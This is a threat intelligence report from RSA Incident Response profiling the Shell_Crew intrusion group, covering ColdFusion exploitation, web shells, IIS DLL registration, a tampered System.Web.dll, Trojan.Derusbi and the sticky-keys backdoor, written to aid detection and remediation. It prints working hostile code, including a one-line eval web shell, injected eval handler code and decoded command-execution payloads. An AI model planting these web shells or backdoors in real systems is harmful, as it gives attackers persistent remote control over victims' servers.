Report Overview The purpose of this report is to share actionable threat intelligence associated with an advanced adversary the RSA IR Team is tracking. Threat intelligence related to advanced adversaries enables security practitioners to mitigate threat impact before the adversary becomes entrenched in an organization’s infrastructure. If a breach has already occurred, threat intelligence bolsters incident investigation activities and expedites remediation; ultimately reducing exposure times and minimizing potential data loss. During recent engagements, the RSA IR Team has responded to multiple incidents involving a common adversary targeting each client’s infrastructure and assets. The RSA IR Team is referring to this threat group internally as “Shell_Crew”; however, they are also referred to as Deep Panda, WebMasters, KungFu Kittens, SportsFans, and PinkPanther amongst the security community. Shell_Crew is generally known to utilize the following tactics, techniques, and procedures (TTPs);  Prevalent use of Web shells to maintain low level persistence in spite of determined remediation efforts;  Occasional use of Web application framework exploits to achieve initial entry as opposed to traditional spearfishing attempts;  Lateral movement using compromised credentials with RDP, psexec, or network connections in conjunction with scheduling jobs with the “at” command.  Abuse of Code Signing infrastructure to validly sign custom backdoor malware;  Exploiting systems using different SETHC.exe methods accessible via Remote Desktop Protocol (RDP);  Long history of IP/DNS telemetry allowing for historical research and link analysis;  Placement of malicious proxy tools introduced into the environment on Windows server based proxies to bypass proxy logging;  Extensive use of time/date stomping of malicious files to hinder forensic analysis; and  Malware leveraging compromised credentials to bypass authentication NTLM proxies (proxy aware). This emerging threat profile covers a sampling of observed indicators that have been derived by analyzing a variety of tools and malicious code collected during recent engagements involving Shell_Crew. Included are details about an observed intrusion vector, entrenchment techniques, unique malicious files, and tools that are used by this adversary. Additionally, the RSA IR Team has provided content in the form of a digital appendix that can be integrated into Security Analytics, the Enterprise Compromise Assessment Tool (ECAT), or other security tools for rapid detection and visibility of indicators associated with Shell_Crew. RSA Incident Response Page 6 RSA Emerging Threat Profile: Shell_Crew Shell_Crew has an affinity for exploiting web application vulnerabilities to gain access to the victim’s network and information systems. In this section, we’ve provided details pertaining to an instance where Shell_Crew breached a victim network through the exploitation of an Adobe ColdFusion directory traversal vulnerability (CVE-2010-2861). This exploit allowed Shell_Crew to read the ‘password.properties’ file containing the password hash of the ColdFusion ‘administrator’ account. After obtaining this password hash, Shell_Crew was able to recover the password associated with the administrative account, likely by using pre-computed rainbow tables. Using the acquired administrator account credentials, Shell_Crew created a ColdFusion scheduled task to download a malicious Web shell to the ColdFusion server. They then utilized this Web shell to upload additional Web shells, hash dumping tools, and other Trojans onto the system, as well as created a backdoor into the system for reentry. Using the tools uploaded to the server, Shell_Crew dumped password hashes from the compromised system, performed network reconnaissance, and moved laterally to systems in the internal network using the compromised credentials with the pass-the-hash technique. Figure 1 below illustrates the high level anatomy of this particular Shell_Crew attack. Figure 1: Anatomy of Shell_Crew Web Application Penetration RSA Incident Response Page 7 RSA Emerging Threat Profile: Shell_Crew Adobe ColdFusion directory traversal vulnerability, CVE-2010-2861, to recover the contents of the password.properties file. Figure 2 below depicts a log entry from the Web server that illustrates the initial point of exploitation. The data highlighted in blue shows the directory traversal used to access the password.properties file. In addition, the data highlighted with red (zh-cn) in the User-Agent indicates the language tag on the attacker’s system. Figure 2: Web server log entry The password.properties file contained the hash value of the ColdFusion administrator account, which can be seen in Figure 3: Example content of a password.properties file Through review of log files found on the Web server, the RSA IR team identified that within 10 minutes of retrieving the password.properties file, Shell_Crew logged in to the ColdFusion management page using the recovered administrator account credentials. This indicates that Shell_Crew quickly enumerated the password from the hash value found in the password.properties file. Once logged in with the administrator account, Shell_Crew scheduled a job called “test” to download a file containing a ColdFusion Web shell from “url” and save it to the Web server’s local directory D:\mywebsite\x.cfm. 1 The log entry from the Web server that shows scheduling of this job is visible in Figure 4. Figure 4: ColdFusion task that downloads Web shell The file downloaded from the remote system to the ColdFusion server, 1234.zip, is a ColdFusion Web shell called “cfm backdoor by ufo”. Once the Web shell was downloaded to the Web server by the ColdFusion job, the adversary was able to utilize the functionality of the Web shell to execute commands on the local system, illustrated in Figure 5 and Figure 6. 1 The name of the website has been changed to protect the privacy of the victim. Opera/9.80+(Windows+NT+6.1;+U;+Edition+IBIS;+zh-cn)+Presto/ 2.10.229+Version/11.61 RSA Incident Response Page 8 RSA Emerging Threat Profile: Shell_Crew Figure 6: Command executed via Web shell Once Shell_Crew has a foothold into the victim’s network, they move to other systems within the environment to ensure multiple points for re-entry. Some of the techniques used by Shell_Crew to further insert themselves into a victim’s environment are outlined in the next section of this report; Entrenchment Techniques Mozilla/4.0+(compatible;+MSIE+6.0;+Windows+NT+5.1) RSA Incident Response Page 9 RSA Emerging Threat Profile: Shell_Crew Entrenchment Techniques Shell_Crew uses a variety of techniques to entrench themselves in a victim’s network. For purposes of this report, the term entrenchment is used to describe a technique used by the adversary that allows them to maintain unauthorized access into an enterprise despite attempted remediation efforts by the victim. In addition to traditional Trojans that beacon out to a destination IP address, this adversary has also been observed utilizing the following entrenchment techniques;  Installation of Web shells;  Registering DLLs with Internet Information Services (IIS);  Modifying the ‘System.Web.dll’ file;  Trojan.Derusbi; and  Utilizing the RDP backdoor ‘sethc.exe’. This section of the report discusses each of these entrenchment techniques in further detail. 1. Installation of Web shells Web shells are files containing malicious code written in various Web scripting languages, such as JSP, CFM, ASP, ASPX, or PHP, that when hosted on a publicly accessible Web site allow an adversary such as Shell_Crew to gain remote access and perform various unauthorized activities on a compromised system and network. A Web shell can be a stand-alone file that only contains Web shell code, or can be an insertion of malicious code directly into an existing legitimate Web site page, thus allowing the adversary to blend with normal traffic and files on the Web server. Using Web shells has several advantages over traditional Trojans including:  Low detection rates from Anti-Virus programs due to the variety and customization of code;  The inability to block or monitor an IP since connectivity can be initiated from any source address; and  There is no beaconing activity from a Web shell. The complexity of the Web shells used by Shell_Crew varies dramatically. Figure 7 shows the contents of a simple Web shell identified during a recent engagement where Shell_Crew had uploaded the Web shell as a standalone file. This one line of code allowed Shell_Crew to execute shell commands remotely on the Web server. The red text depicted within the example has been changed as the password value used by Shell_Crew made reference to the name of the victim company. Figure 7: Example of a simple Shell_Crew Web shell Shell_Crew also uses more complex Web shells that contain hundreds of lines of code and offer advanced functionality equal to many capable Trojans. This functionality can include capabilities such as:  File system traversal;  File/folder upload, download, and modify;  Command execution;  Time stomp files/folder;  Database connectivity; and  Communication obfuscation (typically Base64 or ASCII hex encoding). Figure 8 below is a screenshot of the ColdFusion Web shell used by Shell_Crew as referenced in the Intrusion Vector section of this report. This Web shell contains robust capabilities such as command execution, directory traversal, file uploads, and the ability to gather basic system information. <%@ Page Language="Jscript"%><%eval(Request.Item["password"],"unsafe");%> RSA Incident Response Page 10 RSA Emerging Threat Profile: Shell_Crew Figure 8: ColdFusion Web shell interface example 2. Registering DLLs with Internet Information Services (IIS) Another entrenchment technique used by Shell_Crew on compromised systems is to register a DLL with IIS. Figure 9 below is an example where a malicious DLL was registered with the IIS Web server using the command line. The ScriptMaps.vbs file is a built in function of IIS for running VBScripts, and is fully documented in MSDN Figure 9: Command used to register a DLL with IIS This command line modification will ensure that any incoming request (whether it is a GET, POST, HEAD, or TRACE) with a .jna extension, will be handled by the now registered malicious DLL, in the example in Figure 9, myDLLname.dll. This allows Shell_Crew to make different requests; both in the request type, such as GET or POST, and the file being requested, making detection more difficult. This method of using various request parameters can be coupled with erratic IP Addresses further decreasing the likelihood that the activity will be detected by conventional means. Figure 10 depicts a sample request to a compromised Web server. 2 url cscript D:\mywebsite\ScriptMaps.vbs -a ".jna,C:\windows\system32\inetsrv\ myDLLname.dll,1,GET,HEAD,POST,TRACE" POST /x.cfm HTTP/1.1 Host: mywebsite.com Connection: keep-alive Referer: url Content-Length: 47 Cache-Control: max-age=0 Origin: url User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) Safari/534.30 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0. 8 Accept-Encoding: gzip,deflate,sdch Accept-Language: en-US,en;q=0.8 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3 cmd=cscript+D%3A%5Cmywebsite%5Cbad%5Cenable.vbs RSA Incident Response Page 11 RSA Emerging Threat Profile: Shell_Crew Figure 10: POST request on IIS registered DLL 3. Modifying the ‘System.Web.dll’ file This entrenchment technique was discovered after Shell_Crew made POST requests to nonexistent Web pages on a Web server running IIS. The POST requests always started with a marker string that looked like a hash value. Requests to the same non-existent Web page without the marker would result in a code 404, i.e. page not found. Figure 11 shows an example of a POST request sent by Shell_Crew to a non-existent webpage. Figure 11: POST request to a non-existent Web page The typically benign .NET Microsoft file ‘System.Web.dll’ is an assembly that contains several namespaces. When decompiled with a .NET Decompiler (such as .NET Reflector) the result will be hundreds of C# scripts. Shell_Crew replaced the existing System.Web.dll with a version which contained changes to two C# scripts:  Disassembler\System.Web\System\Web\UI\PageHandlerFactory.cs  Disassembler\System.Web\System\Web\Util\default_aspx.cs The first script file PagehandlerFactory.cs contains adversary added code that looks for this marker in the content of the request: 4B39DD871AD56E6BFEC750C33138B985. When the marker is present, it lets default_aspx.cs handle the request that follows the marker. Figure 12 highlights the modifications made to the PagehandlerFactory.cs file. Figure 12: Modified content of PagehandlerFactory.cs 4B39DD871AD56E6BFEC750C33138B985=Response.Write("-->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System RSA Incident Response Page 12 RSA Emerging Threat Profile: Shell_Crew When called by the script PagehandlerFactory.cs, the file default_aspx.cs, which also contains code added by the adversary, performs the eval function on the request sent in the original POST request to the non-existent Web page. Figure 13: Content of default_aspx.cs In this instance, the POST request contained data that was Base64 encoded to obfuscate the malicious nature of the request, as shown in Figure 14. Figure 14: POST request on nonexistent webpage Below in Figure 15 is the decoded blue text from the POST request in Figure 14. Figure 15: Decoded base64 text from the POST request Additionally, the actual command within the above POST request is also Base64 encoded. Below in Figure 16, the encoded text from the above POST request decoded. var c=new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding(936).GetString(System.Convert. FromBase64String(Request.Item["z1"])));var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System. IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments= "/c "+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["z2"]));e.Start(); out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd()+EI.ReadToEnd()); RSA Incident Response Page 13 RSA Emerging Threat Profile: Shell_Crew Figure 16: The script was further decoded to reveal the contents The reply from the server to these POST requests is not obfuscated and could be found in Web server log files as shown in Figure 17. Figure 17: Reply from infected Web server 4. Trojan.Derusbi In addition to deploying traditional versions of what Symantec calls Trojan.Derusbi (i.e. samples that beacon to a hard- coded domain/IP address), this adversary deployed a custom version of this Trojan on perimeter servers. Trojan.Derusbi typically consists of a DLL and driver file. The driver of the customized Trojan.Derusbi variant in this example monitors all TCP ports that are utilized by various Windows services. When a connection is established on any TCP port, the driver checks to see if it received a handshake packet. The handshake packet contains a simple structure, which allows the Trojan to function even on busy Web servers. When a handshake packet is received, the DLL also replies back with a handshake packet. In addition to the handshake, this variant of Trojan.Derusbi also has an authentication step where the client must send the right password to the Trojan. The communication protocol consist of a 24 byte header, and the data is compressed and obfuscated with 4-byte XOR key, which is dynamically generated for each transmission, and which is included in the 24-byte header. This Trojan offers both typical and advanced Trojan functionalities, such as: file traversal, process start/terminate, upload/download, time stomping, and self-updating. Analysis of customized Trojan.Derusbi variants utilized by Shell_Crew can be found in the below Malicious Files and Secondary Tools section. 5. ‘Sethc’ RDP backdoor – ‘Sticky-Keys backdoor’ This well-known technique that is commonly referred to as the sticky-keys backdoor is used when systems on the targeted organization have Microsoft Remote Desktop Protocol (RDP) enabled. While this technique is not exclusive to Shell_Crew, z1=cmd&z2= cd /d "D:\mywebserver\"&whoami&echo [S]&cd&echo [E] z1=Y21k&z2=Y2QgL2QgIkQ6XG15d2Vic2VydmVyXCImd2hvYW1pJmVjaG8gW1NdJmNkJmVjaG8gW0Vd RSA Incident Response Page 14 RSA Emerging Threat Profile: Shell_Crew the RSA IR Team has observed this group utilize the technique in several different environments. There are two common ways that a system can be exploited using this technique. 1. File sethc.exe is replaced with another file (typically cmd.exe or explorer.exe) in one or both of these two locations: C:\Windows\system32\sethc.exe C:\Windows\system32\dllcache\sethc.exe The result of making this change on a system which has RDP enabled, is that once presented with the RDP Windows logon screen, simply pressing the SHIFT key 5 times will launch either a command shell (cmd.exe), a windows explorer window (explorer.exe), or whatever program was copied to replace the sethc.exe application executable. 2. The second technique makes a registry modification to launch a debugger anytime sethc.exe is executed and registers cmd.exe (or any other file) as the debugger. So, anytime sethc.exe is invoked (explained in the next paragraph), Windows automatically executes its “debugger”, i.e.cmd.exe. The registry modification is shown in Figure 18. Figure 18: Registry modification to invoke sethc.exe debugging The result of making this change on a system which has RDP enabled, is that once presented with the RDP Windows logon screen, simply pressing the SHIFT key 5 times will launch either a command shell, cmd.exe as shown in Figure 18, or whichever program has been set as the debug program in the registry. The process runs under the context of the SYSTEM account. Since this technique does not involve any malicious files, there is limited capability for AV vendors to detect this backdoor. 